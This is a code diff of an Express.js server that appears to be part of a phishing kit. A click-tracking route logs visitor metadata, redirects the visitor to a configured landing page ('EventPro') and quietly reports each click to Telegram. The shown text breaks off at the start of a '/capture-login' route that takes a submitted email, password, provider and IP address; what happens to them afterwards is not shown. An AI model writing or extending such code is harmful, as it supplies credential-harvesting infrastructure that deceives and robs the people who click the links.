@@ -66,20 +66,20 @@ app.get("/", (req, res) => {
 
 // ── Click Tracking Route ──
 // Example: /track/campaign1
+
 app.get("/track/:linkId", (req, res) => {
   const { linkId } = req.params;
 
-  // Validate the tracking link ID
+  // Only allow simple tracking IDs
   if (!/^[a-zA-Z0-9_-]{1,60}$/.test(linkId)) {
     return res.status(400).send("Invalid tracking link ID.");
   }
 
-  // Destination is configured in the hosting environment
   const destination = process.env.LANDING_PAGE_URL;
 
   if (!destination) {
     return res.status(503).send(
-      "Landing page URL is not configured."
+      "LANDING_PAGE_URL is missing in Render."
     );
   }
 
@@ -88,16 +88,13 @@ app.get("/track/:linkId", (req, res) => {
   try {
     landingPage = new URL(destination);
 
-    if (!["https:", "http:"].includes(landingPage.protocol)) {
-      throw new Error("Unsupported URL protocol");
+    if (!["http:", "https:"].includes(landingPage.protocol)) {
+      throw new Error("Invalid URL protocol");
     }
   } catch {
-    return res.status(500).send(
-      "The configured landing page URL is invalid."
-    );
+    return res.status(500).send("Invalid landing page URL.");
   }
 
-  // Capture limited, ordinary click metadata
   const userAgent = req.get("user-agent") || "Unknown";
   const referrer = req.get("referer") || "Direct / unknown";
 
@@ -107,24 +104,23 @@ app.get("/track/:linkId", (req, res) => {
       ? "Mobile"
       : "Desktop or unknown";
 
-  const time = new Date().toISOString();
-
   const details = [
     `Link ID: ${linkId}`,
-    `Time (UTC): ${time}`,
+    `Time (UTC): ${new Date().toISOString()}`,
     `Device: ${device}`,
     `Referrer: ${referrer.slice(0, 300)}`,
   ].join("\n");
 
-  // Redirect the visitor to your configured website
+  // Redirect to EventPro
   res.redirect(302, landingPage.toString());
 
-  // Send the alert to both Telegram accounts
+  // Send Telegram notifications to both configured chat IDs
   sendTelegramAlert("Website Link Clicked", details)
     .catch((err) => {
-      console.error("Click notification error:", err.message);
+      console.error("Click notification failed:", err.message);
     });
 });
+
 app.post("/capture-login", (req, res) => {
   const { email, password, provider } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
